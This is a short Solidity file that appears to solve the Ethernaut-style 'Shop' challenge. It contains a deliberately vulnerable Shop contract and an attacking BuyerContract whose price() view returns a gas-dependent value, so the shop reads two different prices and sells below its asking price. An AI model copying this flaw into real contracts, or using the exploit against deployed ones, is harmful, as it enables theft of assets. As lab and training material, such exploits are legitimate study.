// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

/**
    This contract can be attacked performing an operation with the remaining gas of the transaction a return two different numbers when the view function is called    
 */
contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract BuyerContract {

    function price() external view returns(uint){
         return gasleft()/105;
    }

    function callBuy(address _shopContract) external {
        Shop _shopContract = Shop(_shopContract);
        _shopContract.buy();
    }
}